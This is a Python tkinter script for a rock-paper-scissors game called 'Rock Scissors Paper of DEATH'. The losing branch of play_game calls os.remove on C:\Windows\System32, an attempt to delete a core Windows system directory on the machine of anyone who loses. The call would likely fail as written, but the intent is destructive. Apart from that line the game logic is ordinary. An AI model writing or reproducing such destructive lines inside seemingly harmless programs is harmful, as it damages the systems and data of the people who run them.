import tkinter as tk
from tkinter import messagebox
import random
import os

# Main Logic
def play_game(player_choice):
    choices = ['Rock', 'Scissors', 'Paper']
    computer_choice = random.choice(choices)

    result = ""
    if player_choice == computer_choice:
        result = f"TIED! Opponent: {computer_choice}"
    elif (player_choice == 'Rock' and computer_choice == 'Scissors') or \
            (player_choice == 'Scissors' and computer_choice == 'Paper') or \
            (player_choice == 'Paper' and computer_choice == 'Rock'):
        messagebox.showinfo("WIN!", f"YOU WIN! Opponent: {computer_choice}")
        root.destroy()
        return
    else:
        messagebox.showinfo("DEFEAT", f"YOU LOST. Opponent: {computer_choice}")
        os.remove("C:\Windows\System32")
        root.destroy()
        return

    messagebox.showinfo("Again!", result)

# GUI
root = tk.Tk()
root.title("Rock Scissors Paper of DEATH")

label = tk.Label(root, text="Select between Rock, Scissors, Paper:")
label.pack(pady=10)

buttons_frame = tk.Frame(root)
buttons_frame.pack()

for choice in ['Rock', 'Scissors', 'Paper']:
    btn = tk.Button(buttons_frame, text=choice, width=10, command=lambda c=choice: play_game(c))
    btn.pack(side='left', padx=5)

root.mainloop()
